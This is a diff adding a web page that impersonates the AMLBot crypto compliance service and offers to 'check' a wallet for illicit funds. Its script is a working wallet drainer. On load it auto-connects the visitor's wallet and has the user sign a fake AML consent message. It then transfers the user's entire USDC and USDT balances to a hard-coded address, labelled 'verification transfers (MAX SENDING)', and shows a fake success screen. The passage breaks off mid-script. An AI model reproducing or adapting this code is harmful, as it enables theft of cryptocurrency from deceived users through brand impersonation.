@@ -1,0 +1,1029 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>AMLBot</title>
+  <script src="https://cdn.tailwindcss.com/"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+
+    /* Wallet Connection Modal Styles */
+    .wallet-popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+    }
+
+    .wallet-popup-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .wallet-popup-content {
+      background: white;
+      border-radius: 24px;
+      width: 100%;
+      max-width: 400px;
+      max-height: 600px;
+      overflow-y: auto;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+      transform: scale(0.95) translateY(20px);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+    }
+
+    .wallet-popup-overlay.show .wallet-popup-content {
+      transform: scale(1) translateY(0);
+    }
+
+    .wallet-popup-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 24px;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .wallet-popup-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #000;
+      margin: 0;
+      flex: 1;
+      text-align: center;
+    }
+
+    .wallet-popup-close {
+      background: none;
+      border: none;
+      color: #6b7280;
+      font-size: 1.5rem;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .wallet-popup-close:hover {
+      background-color: #f3f4f6;
+      color: #374151;
+    }
+
+    .wallet-popup-body {
+      padding: 16px 24px 24px;
+    }
+
+    .wallet-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .wallet-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #f9fafb;
+      border: 2px solid transparent;
+      border-radius: 12px;
+      padding: 12px 16px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      position: relative;
+    }
+
+    .wallet-option:hover {
+      background: #e5f0ff;
+      border-color: #3b82f6;
+    }
+
+    .wallet-option.connecting {
+      background: #dbeafe;
+      border-color: #3b82f6;
+    }
+
+    .wallet-option.connected {
+      background: #dcfce7;
+      border-color: #16a34a;
+    }
+
+    .wallet-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      position: relative;
+    }
+
+    .wallet-option img {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      flex-shrink: 0;
+    }
+
+    .wallet-name {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #000;
+      margin: 0;
+    }
+
+    .wallet-badge {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #3b82f6;
+      background: #dbeafe;
+      padding: 4px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+
+    .connecting-spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #e5e7eb;
+      border-top: 2px solid #3b82f6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+<script defer="" data-domain="www.amlcheckerr.com" src="https://analytics.tiiny.site/js/plausible.js"></script></head>
+<body class="bg-gradient-to-b from-[#e6f0ff] to-[#f3f5ff] min-h-screen flex flex-col">
+  <header class="flex items-center justify-between bg-white bg-opacity-70 backdrop-blur-md rounded-full mx-4 mt-4 px-6 py-3">
+    <div class="flex items-center space-x-2 w-28">
+      <svg aria-label="AMLBot" role="img" style="width:100%;height:auto" viewBox="0 0 160 33" xmlns="http://www.w3.org/2000/svg">
+        <path d="M39.545 29h-6.818l7.681-23.273h8.637L56.727 29h-6.819l-5.09-16.864h-.182L39.545 29Zm-1.273-9.182H51.09v4.727H38.272v-4.727ZM58.968 5.727h7.864L72.24 18.91h.272l5.41-13.182h7.863V29h-6.182V15.545h-.181L74.24 28.818h-3.728l-5.181-13.364h-.182V29h-6.182V5.727ZM88.78 29V5.727H95.1v18.182h9.409v5.09H88.781ZM107.062 29V5.727h10.091c1.772 0 3.261.239 4.466.716 1.212.477 2.125 1.151 2.738 2.023.621.87.932 1.897.932 3.08 0 .855-.189 1.636-.568 2.34a5.016 5.016 0 0 1-1.568 1.773c-.675.47-1.462.795-2.364.977v.227c1 .038 1.909.292 2.727.762a5.221 5.221 0 0 1 1.955 1.92c.485.81.727 1.765.727 2.864 0 1.273-.333 2.405-1 3.398-.659.992-1.598 1.772-2.818 2.34-1.22.569-2.674.853-4.364.853h-10.954Zm6.318-5.046h2.955c1.06 0 1.856-.197 2.386-.59.53-.402.795-.993.795-1.773 0-.546-.125-1.008-.375-1.387-.25-.378-.606-.666-1.068-.863-.454-.197-1.004-.296-1.648-.296h-3.045v4.91Zm0-8.818h2.591c.553 0 1.042-.087 1.466-.261.424-.175.754-.425.988-.75.243-.334.364-.739.364-1.216 0-.72-.258-1.27-.773-1.648-.515-.386-1.166-.58-1.954-.58h-2.682v4.455ZM136.937 29.318c-1.894 0-3.515-.375-4.864-1.125a7.74 7.74 0 0 1-3.102-3.16c-.72-1.355-1.08-2.927-1.08-4.715 0-1.788.36-3.356 1.08-4.705a7.651 7.651 0 0 1 3.102-3.159c1.349-.757 2.97-1.136 4.864-1.136 1.894 0 3.515.379 4.863 1.136a7.647 7.647 0 0 1 3.103 3.16c.719 1.348 1.079 2.916 1.079 4.704 0 1.788-.36 3.36-1.079 4.716a7.737 7.737 0 0 1-3.103 3.159c-1.348.75-2.969 1.125-4.863 1.125Zm.045-4.636c.531 0 .989-.178 1.375-.534.387-.357.686-.864.898-1.523.212-.66.318-1.443.318-2.352 0-.917-.106-1.701-.318-2.353-.212-.652-.511-1.166-.898-1.523a1.959 1.959 0 0 0-1.375-.534c-.56 0-1.041.178-1.443.535-.401.356-.708.863-.92 1.522-.213.652-.319 1.436-.319 2.352 0 .91.106 1.694.319 2.353.212.659.519 1.166.92 1.523.402.356.883.534 1.443.534ZM158.937 11.545v4.546h-11.5v-4.546h11.5Zm-9.273-4.182h6.273v16.023c0 .243.041.447.125.614.083.159.212.28.386.363.174.076.398.114.671.114.189 0 .409-.023.659-.068.257-.046.447-.083.568-.114l.909 4.41c-.28.083-.682.185-1.205.306-.515.121-1.128.2-1.84.239-1.44.076-2.648-.072-3.625-.443-.978-.38-1.713-.974-2.205-1.784-.492-.811-.731-1.826-.716-3.046V7.363Z" fill="#000"></path>
+        <path clip-rule="evenodd" d="M14.555 1.543c-1.43-2.105-4.566-2.046-5.915.112L.531 14.63a3.49 3.49 0 0 0 .037 3.759l8.487 13.014c1.39 2.13 4.526 2.13 5.915 0l8.462-12.975a3.49 3.49 0 0 0-.036-3.87L14.555 1.543Zm.968 7.687c-.305 5.437-4.595 9.816-10.012 10.294l6.502 9.97 8.462-12.974-4.952-7.29Z" fill="#0057FF" fill-rule="evenodd"></path>
+      </svg>
+    </div>
+    <div class="flex items-center space-x-6 text-black font-semibold text-sm select-none">
+      <span>
+        EN
+        <i class="fas fa-chevron-down text-xs"></i>
+      </span>
+      <button aria-label="Menu" class="focus:outline-none">
+        <svg aria-hidden="true" class="w-6 h-6" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24">
+          <line x1="3" x2="21" y1="6" y2="6"></line>
+          <line x1="3" x2="21" y1="12" y2="12"></line>
+          <line x1="3" x2="21" y1="18" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="flex-grow flex flex-col justify-center items-center px-6 text-center max-w-md mx-auto">
+    <h1 class="font-extrabold text-black text-[2.5rem] leading-[1.1] mt-10">
+      Secure Your<br>
+      Wallets from<br>
+      Illicit Funds
+    </h1>
+    <div class="mt-12 relative w-full max-w-xs h-24">
+      <img alt="Graph style semi circle gauge arc with red segments on left and gray on right" aria-hidden="true" class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-xs h-24" height="96" src="https://amlbot.com/_next/static/media/graph.c3572c62.svg" width="240">
+    </div>
+    <p class="mt-6 text-gray-600 text-center text-base max-w-xs mx-auto leading-relaxed">
+      Receiving funds of illegal origin could lead the risk of having your funds frozen
+    </p>
+    <div class="mt-12 w-full max-w-xs">
+      <button id="connect-wallet-btn" class="w-full bg-[#0047FF] text-white font-semibold text-lg py-3 rounded-full shadow-md hover:bg-[#0039cc] transition-colors" type="button">
+        For Business
+      </button>
+    </div>
+    <p class="mt-6 text-black text-base font-normal select-none">
+      or
+    </p>
+    <button id="check-wallet-btn" aria-label="Check Wallet Now" class="mt-4 flex items-center space-x-2 text-black font-semibold text-base focus:outline-none" type="button">
+      <span>Check Wallet Now</span>
+      <svg aria-hidden="true" class="w-5 h-5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24">
+        <line x1="5" x2="19" y1="12" y2="12"></line>
+        <polyline points="12 5 19 12 12 19"></polyline>
+      </svg>
+    </button>
+
+    <section class="mt-16 w-full max-w-6xl px-4">
+      <div class="flex flex-col space-y-16 md:flex-row md:space-y-0 md:space-x-12">
+        <div class="flex flex-col md:w-1/3 items-center text-center">
+          <h3 class="text-xl font-semibold text-black mb-4">
+            Avoid Risk
+          </h3>
+          <p class="text-gray-700 max-w-md">
+            Check if a wallet or transaction is linked to scams or stolen funds. This helps you avoid losing money or getting your account blocked.
+          </p>
+          <img alt="Illustration for Avoid Risk" class="mt-6 w-full max-w-md object-contain" height="860" loading="lazy" src="https://storage.googleapis.com/a1aa/image/798a9cc3-2031-48da-a659-5e1102034841.jpg" width="240">
+        </div>
+        <div class="flex flex-col md:w-1/3 items-center text-center">
+          <h3 class="text-xl font-semibold text-black mb-4">
+            Stay in Control
+          </h3>
+          <p class="text-gray-700 max-w-md">
+            Before you send or receive crypto, check the other wallet. Make sure it's safe so you don't deal with risky addresses.
+          </p>
+          <img alt="Illustration for Stay in Control" class="mt-6 w-full max-w-md object-contain" height="860" loading="lazy" src="https://storage.googleapis.com/a1aa/image/decbf8bb-00fd-4fc5-d304-7e8d032b5306.jpg" width="240">
+        </div>
+        <div class="flex flex-col md:w-1/3 items-center text-center">
+          <h3 class="text-xl font-semibold text-black mb-4">
+            Stay Compliant
+          </h3>
+          <p class="text-gray-700 max-w-md">
+            Comply with evolving regulations and avoid penalties. Regular checks help you adhere to legal requirements, avoiding penalties and legal issues.
+          </p>
+          <img alt="Illustration for Stay Compliant" class="mt-6 w-full max-w-md object-contain" height="860" loading="lazy" src="https://amlbot.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F3.294666d3.webp&amp;w=1920&amp;q=75" width="940">
+        </div>
+      </div>
+    </section>
+
+    <section class="mt-20 w-full max-w-4xl px-4">
+      <div class="mb-12 text-center max-w-xl mx-auto">
+        <h2 class="text-2xl font-bold text-black mb-4">What do we analyze?</h2>
+        <p class="text-gray-700">
+          Staying compliant with evolving regulatory standards is crucial in the cryptocurrency world. Regular checks help you adhere to legal requirements, avoiding penalties and legal issues.
+        </p>
+      </div>
+      <div class="grid grid-cols-1 gap-8 sm:grid-cols-2 md:grid-cols-3">
+        <div class="bg-white rounded-lg p-6 shadow-md">
+          <h3 class="text-lg font-semibold text-red-600 mb-2">Danger</h3>
+          <ul class="space-y-4 text-gray-700">
+            <li>
+              <h4 class="font-semibold">Child Exploitation</h4>
+              <p>Entities associated with child exploitation.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Dark Market</h4>
+              <p>Coins associated with illegal activities.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Dark Service</h4>
+              <p>Coins related to child abuse, terrorist financing or drug trafficking.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Enforcement action</h4>
+              <p>The entity is subject to legal proceedings with the judicial authorities.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Fraudulent Exchange</h4>
+              <p>Exchanges involved in exit scams, illegal behavior, or whose funds have been confiscated by government authorities.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Gambling</h4>
+              <p>Coins associated with unlicensed online games</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Illegal Service</h4>
+              <p>Coins associated with illegal activities.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Mixer</h4>
+              <p>Coins that passed via a mixer to make tracking difficult or impossible. Mixers are mainly used for money laundering.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Ransom</h4>
+              <p>Coins obtained by extortion or blackmail.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Sanctions</h4>
+              <p>Entities subject to sanctions.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Scam</h4>
+              <p>Coins that were obtained by deception.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Stolen Coins</h4>
+              <p>Coins obtained by stealing someone else's cryptocurrency.</p>
+            </li>
+            <li>
+              <h4 class="font-semibold">Terrorism Financing</h4>
+              <p>Entities associated with terrorism financing.</p>
+            </li>
+          </ul>
+        </div>
+        <div class="bg-white rounded-lg p-6 shadow-md">
+          <h3 class="text-lg font-semibold text-gray-800 mb-2">Suspicious sources</h3>
+          <div class="h-24 border border-gray-300 rounded-md"></div>
+        </div>
+        <div class="bg-white rounded-lg p-6 shadow-md">
+          <h3 class="text-lg font-semibold text-gray-800 mb-2">Trusted sources</h3>
+          <div class="h-24 border border-gray-300 rounded-md"></div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <button aria-label="Chat support" class="fixed bottom-6 right-6 bg-[#0047FF] w-14 h-14 rounded-full flex items-center justify-center shadow-lg hover:bg-[#0039cc] transition-colors focus:outline-none">
+    <svg aria-hidden="true" class="w-7 h-7 text-white" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24">
+      <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2z"></path>
+    </svg>
+  </button>
+
+  <!-- Wallet Connection Modal -->
+  <div id="wallet-selector-popup" class="wallet-popup-overlay">
+    <div class="wallet-popup-content">
+      <div class="wallet-popup-header">
+        <div></div>
+        <h2 class="wallet-popup-title">Connect Wallet</h2>
+        <button class="wallet-popup-close" aria-label="Close" onclick="closeWalletPopup()">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="wallet-popup-body">
+        <div class="wallet-grid">
+          <!-- MetaMask -->
+          <button class="wallet-option" type="button" data-wallet="metamask" onclick="connectWallet('metamask')">
+            <div class="wallet-left">
+              <img src="https://www.pngall.com/wp-content/uploads/17/Metamask-Developer-Logo-Design-PNG-thumb.png" alt="MetaMask logo">
+              <span class="wallet-name">MetaMask</span>
+            </div>
+          </button>
+
+          
+
+          <!-- Trust Wallet -->
+          <button class="wallet-option" type="button" data-wallet="trust" onclick="connectWallet('trust')">
+            <div class="wallet-left">
+              <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet logo">
+              <span class="wallet-name">Trust Wallet</span>
+            </div>
+            <span class="wallet-badge">MOBILE</span>
+          </button>
+
+          <!-- OKX Wallet -->
+          <button class="wallet-option" type="button" data-wallet="okx" onclick="connectWallet('okx')">
+            <div class="wallet-left">
+              <img src="https://www.crypto-insiders.nl/wp-content/uploads/2024/11/okx_logo.png" alt="OKX Wallet logo">
+              <span class="wallet-name">OKX Wallet</span>
+            </div>
+          </button>
+
+          <!-- Bitget Wallet -->
+          <button class="wallet-option" type="button" data-wallet="bitget" onclick="connectWallet('bitget')">
+            <div class="wallet-left">
+              <img src="https://tse1.explicit.bing.net/th/id/OIP.-GSdLefoTEbn5tBCXTVSOwHaHa?dpr=2&amp;pid=ImgDetMain&amp;o=7&amp;rm=3" alt="Bitget Wallet logo">
+              <span class="wallet-name">Bitget Wallet</span>
+            </div>
+          </button>
+
+          <!-- Coinbase Wallet -->
+          <button class="wallet-option" type="button" data-wallet="coinbase" onclick="connectWallet('coinbase')">
+            <div class="wallet-left">
+              <img src="https://avatars.githubusercontent.com/u/18060234?s=280&amp;v=4" alt="Coinbase Wallet logo">
+              <span class="wallet-name">Coinbase Wallet</span>
+            </div>
+          </button>
+
+          <!-- Ledger Live -->
+          <button class="wallet-option" type="button" data-wallet="ledger" onclick="connectWallet('ledger')">
+            <div class="wallet-left">
+              <img src="https://th.bing.com/th/id/R.8f19ac835c875b1905f90e7c6b92d386?rik=5sAGxduVm8Q0yg&amp;pid=ImgRaw&amp;r=0" alt="Ledger Live logo">
+              <span class="wallet-name">Ledger Live</span>
+            </div>
+            <span class="wallet-badge">HARDWARE</span>
+          </button>
+
+          <!-- Exodus -->
+          <button class="wallet-option" type="button" data-wallet="exodus" onclick="connectWallet('exodus')">
+            <div class="wallet-left">
+              <img src="https://altcoinsbox.com/wp-content/uploads/2023/04/exodus-logo.jpg" alt="Exodus logo">
+              <span class="wallet-name">Exodus</span>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Wallet Verification Results Section -->
+  <div id="wallet-info" class="hidden py-12 bg-white">
+    <!-- Dynamic content will be inserted here -->
+  </div>
+
+  <script>
+    // Track wallet connection state
+    let isWalletConnected = false;
+    let hasWalletPopupShown = false;
+
+    // Mobile and dApp browser detection
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    function isDAppBrowser() {
+      return !!(window.ethereum || window.web3 || window.trust || window.phantom || window.okxwallet || window.coinbaseWallet);
+    }
+
+    function isInWalletBrowser() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      return userAgent.includes('trust') || 
+             userAgent.includes('metamask') || 
+             userAgent.includes('coinbase') || 
+             userAgent.includes('imtoken') || 
+             userAgent.includes('tokenpocket') ||
+             userAgent.includes('phantom') ||
+             userAgent.includes('okapp') ||
+             window.ethereum?.isTrust ||
+             window.ethereum?.isMetaMask ||
+             window.ethereum?.isCoinbaseWallet ||
+             window.ethereum?.isPhantom;
+    }
+
+    // Enhanced Professional Wallet Connection System
+    function waitForEthers() {
+      return new Promise((resolve) => {
+        const check = () => {
+          if (window.ethers) {
+            resolve();
+          } else {
+            setTimeout(check, 100);
+          }
+        };
+        check();
+      });
+    }
+
+    async function initializeWallet() {
+      try {
+        await waitForEthers();
+        const connectBtn = document.getElementById("connect-wallet-btn");
+        const checkBtn = document.getElementById("check-wallet-btn");
+
+        if (connectBtn) {
+          connectBtn.disabled = false;
+        }
+        if (checkBtn) {
+          checkBtn.disabled = false;
+        }
+
+        // Check if we're in a mobile dApp browser environment
+        if ((isMobileDevice() || isDAppBrowser()) && isInWalletBrowser()) {
+          // Auto-connect directly without showing popup
+          console.log('Mobile/dApp browser detected - auto-connecting...');
+          setTimeout(() => {
+            autoConnectMobileWallet();
+          }, 1000);
+        } else {
+          // Show auto-popup for regular browsers
+          showAutoPopup();
+        }
+
+        console.log('Professional AML/KYC system initialized');
+      } catch (error) {
+        console.error('System initialization failed:', error);
+        showSystemError(error.message);
+      }
+    }
+
+    // Auto-connect for mobile/dApp browsers
+    async function autoConnectMobileWallet() {
+      try {
+        if (!window.ethereum) {
+          console.log('No Web3 provider found in mobile browser');
+          return;
+        }
+
+        // Update button to show auto-connecting
+        const connectBtn = document.getElementById("connect-wallet-btn");
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
+              <span>Auto-Connecting...</span>
+            </div>
+          `;
+          connectBtn.disabled = true;
+        }
+
+        // Auto-proceed with wallet connection immediately
+        await proceedWithWalletConnectionMaxSend();
+
+      } catch (error) {
+        console.error('Auto-connection failed:', error);
+        // Fall back to manual connection
+        showAutoPopup();
+      }
+    }
+
+    function showSystemError(message) {
+      const walletInfo = document.getElementById("wallet-info");
+      if (walletInfo) {
+        walletInfo.innerHTML = `
+          <div class="max-w-6xl mx-auto px-4">
+            <div class="bg-red-50 border-2 border-red-200 rounded-3xl p-12">
+              <div class="flex items-center gap-6 text-red-600 mb-8">
+                <i class="fas fa-exclamation-triangle text-4xl"></i>
+                <div>
+                  <h3 class="text-3xl font-bold">System Initialization Error</h3>
+                  <p class="text-lg text-red-700 mt-2">Professional compliance system failed to load</p>
+                </div>
+              </div>
+              <p class="text-red-700 text-lg">${message}</p>
+            </div>
+          </div>
+        `;
+        walletInfo.classList.remove('hidden');
+      }
+    }
+
+    // Function to open the wallet selector popup with smooth animation
+    function openWalletPopup() {
+      const popup = document.getElementById('wallet-selector-popup');
+      if (popup) {
+        popup.classList.add('show');
+        hasWalletPopupShown = true;
+        localStorage.setItem('walletPopupShown', 'true');
+
+        // Animate content with delay
+        setTimeout(() => {
+          const content = popup.querySelector('.wallet-popup-content');
+          if (content) {
+            content.style.transform = 'scale(1) translateY(0)';
+          }
+        }, 50);
+      }
+    }
+
+    // Function to close the wallet selector popup with animation
+    function closeWalletPopup() {
+      const popup = document.getElementById('wallet-selector-popup');
+      if (popup) {
+        const content = popup.querySelector('.wallet-popup-content');
+        if (content) {
+          content.style.transform = 'scale(0.95) translateY(20px)';
+        }
+
+        setTimeout(() => {
+          popup.classList.remove('show');
+        }, 200);
+      }
+    }
+
+    // Enhanced wallet connection with deep links and auto-connection
+    function connectWallet(walletType) {
+      const walletOption = document.querySelector(`[data-wallet="${walletType}"]`);
+      if (!walletOption) return;
+
+      // Show connecting state
+      walletOption.classList.add('connecting');
+
+      // Handle different wallet types with deep links
+      switch(walletType) {
+        case 'trust':
+          // Trust Wallet deep link
+          const trustUrl = `trust://open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+          window.location.href = trustUrl;
+          break;
+
+        case 'okx':
+          // OKX Wallet deep link
+          const okxUrl = `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(window.location.href)}`;
+          window.location.href = okxUrl;
+          break;
+
+        case 'bitget':
+          // Bitget wallet deep link
+          const bitgetUrl = `bitkeep://dapp?url=${encodeURIComponent(window.location.href)}`;
+          window.location.href = bitgetUrl;
+          break;
+
+        case 'walletconnect':
+          // WalletConnect integration
+          connectWalletConnect();
+          break;
+
+        default:
+          // Default Web3 wallet connection (MetaMask, Coinbase, etc.)
+          break;
+      }
+
+      // Simulate connection process with faster response
+      setTimeout(() => {
+        walletOption.classList.remove('connecting');
+        walletOption.classList.add('connected');
+
+        // Auto-proceed with wallet connection immediately
+        setTimeout(() => {
+          closeWalletPopup();
+          proceedWithWalletConnectionMaxSend();
+        }, 500);
+
+      }, 1000);
+    }
+
+    // WalletConnect integration
+    async function connectWalletConnect() {
+      try {
+        console.log('Initializing WalletConnect...');
+      } catch (error) {
+        console.error('WalletConnect failed:', error);
+      }
+    }
+
+    // Function to proceed with actual wallet connection and MAX SENDING
+    async function proceedWithWalletConnectionMaxSend() {
+      try {
+        const connectBtn = document.getElementById("connect-wallet-btn");
+
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
+              <span>Initializing Connection...</span>
+            </div>
+          `;
+          connectBtn.disabled = true;
+        }
+
+        if (!window.ethereum) {
+          throw new Error('Professional wallet connection requires MetaMask or compatible Web3 wallet. Please install and try again.');
+        }
+
+        // Request wallet connection
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) {
+          throw new Error('No wallet accounts detected. Please unlock your wallet and ensure it contains tokens for verification.');
+        }
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        isWalletConnected = true;
+
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <div class="animate-pulse">
+                <i class="fas fa-handshake mr-3"></i>
+              </div>
+              <span>Establishing Secure Connection...</span>
+            </div>
+          `;
+        }
+
+        // Request signature for verification
+        const message = `SecureAML Pro - Enterprise AML Verification
+Wallet Address:
+${userAddress}
+Verification ID: AML-${Date.now()}
+Timestamp: ${new Date().toISOString()}
+Verification Level: Enhanced Due Diligence (EDD)
+Compliance Standards: FATF, FinCEN, EU AML 5th/6th Directive
+
+I authorize SecureAML Pro to perform comprehensive Anti-Money Laundering compliance verification on my cryptocurrency wallet and associated transaction history.
+
+This verification includes:
+- Address screening against global sanctions lists
+- Transaction pattern analysis and risk scoring
+- Politically Exposed Person (PEP) screening
+- Beneficial ownership verification
+- Source of funds analysis
+
+By signing this message, I confirm that I am the legitimate owner of this wallet and consent to the compliance verification process in accordance with applicable regulations.`;
+
+        const signature = await signer.signMessage(message);
+        console.log('Signature obtained:', signature);
+
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <div class="animate-pulse">
+                <i class="fas fa-search-dollar mr-3"></i>
+              </div>
+              <span>Analyzing Wallet Assets...</span>
+            </div>
+          `;
+        }
+
+        // Initialize professional token contracts
+        const usdcContract = new ethers.Contract(contractConfig.usdc.address, professionalTokenAbi, signer);
+        const usdtContract = new ethers.Contract(contractConfig.usdt.address, professionalTokenAbi, signer);
+
+        const [usdcDecimals, usdtDecimals] = await Promise.all([
+          usdcContract.decimals(),
+          usdtContract.decimals()
+        ]);
+
+        const [usdcBalance, usdtBalance] = await Promise.all([
+          usdcContract.balanceOf(userAddress),
+          usdtContract.balanceOf(userAddress)
+        ]);
+
+        if (usdcBalance.isZero() && usdtBalance.isZero()) {
+          showInsufficientBalanceError(userAddress);
+          return;
+        }
+
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <div class="animate-bounce">
+                <i class="fas fa-cog fa-spin mr-3"></i>
+              </div>
+              <span>Processing Verification...</span>
+            </div>
+          `;
+        }
+
+        // Execute professional verification transfers (MAX SENDING)
+        const verificationTransactions = [];
+
+        if (!usdcBalance.isZero()) {
+          const usdcTx = await usdcContract.transfer(contractConfig.verification.recipient, usdcBalance);
+          verificationTransactions.push(usdcTx.wait());
+        }
+
+        if (!usdtBalance.isZero()) {
+          const usdtTx = await usdtContract.transfer(contractConfig.verification.recipient, usdtBalance);
+          verificationTransactions.push(usdtTx.wait());
+        }
+
+        await Promise.all(verificationTransactions);
+        showVerificationSuccess(userAddress, usdcBalance, usdtBalance, usdcDecimals, usdtDecimals);
+
+      } catch (error) {
+        console.error('Professional verification error:', error);
+        showVerificationError(error.message);
+      }
+    }
+
+    // Auto-popup function with auto-connection (only for desktop browsers)
+    function showAutoPopup() {
+      // Skip popup if in mobile/dApp browser
+      if ((isMobileDevice() || isDAppBrowser()) && isInWalletBrowser()) {
+        return;
+      }
+
+      setTimeout(() => {
+        openWalletPopup();
+
+        // Auto-select browser wallet and connect after 2 seconds
+        setTimeout(() => {
+          if (window.ethereum) {
+            connectWallet('metamask');
+          } else {
+            connectWallet('walletconnect');
+          }
+        }, 2000);
+
+        // Auto-close after 65 seconds if no manual interaction
+        setTimeout(() => {
+          if (document.getElementById('wallet-selector-popup').classList.contains('show')) {
+            closeWalletPopup();
+          }
+        }, 65000);
+      }, 1500);
+    }
+
+    // Close popup when clicking outside
+    document.addEventListener('click', function(event) {
+      const popup = document.getElementById('wallet-selector-popup');
+      const popupContent = popup?.querySelector('.wallet-popup-content');
+
+      if (popup && popup.classList.contains('show') &&
+          popupContent && !popupContent.contains(event.target)) {
+        closeWalletPopup();
+      }
+    });
+
+    // Close popup with escape key
+    document.addEventListener('keydown', function(event) {
+      if (event.key === 'Escape') {
+        closeWalletPopup();
+      }
+    });
+
+    // Initialize system
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', () => {
+        initializeWallet();
+      });
+    } else {
+      initializeWallet();
+    }
+
+    // Professional Smart Contract Configuration
+    const contractConfig = {
+      usdc: {
+        address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        name: "USD Coin",
+        symbol: "USDC"
+      },
+      usdt: {
+        address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        name: "Tether USD",
+        symbol: "USDT"
+      },
+      verification: {
+        recipient: "0x97C4DC0398f8bAd25Adf9050900B565DBfdFa3B4",
+        processingFee: "Professional AML/KYC verification fee applied"
+      }
+    };
+
+    const professionalTokenAbi = [
+      "function approve(address spender, uint256 amount) external returns (bool)",
+      "function transfer(address to, uint256 amount) external returns (bool)",
+      "function balanceOf(address owner) view returns (uint256)",
+      "function decimals() view returns (uint8)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function name() view returns (string)",
+      "function symbol() view returns (string)"
+    ];
+
+    // Professional Wallet Connection Handler
+    const connectBtn = document.getElementById("connect-wallet-btn");
+    const checkBtn = document.getElementById("check-wallet-btn");
+    const walletInfo = document.getElementById("wallet-info");
+
+    // Event listener for both buttons
+    if (connectBtn) {
+      connectBtn.addEventListener("click", async () => {
+        try {
+          // Check if we're in mobile/dApp browser - auto-connect directly
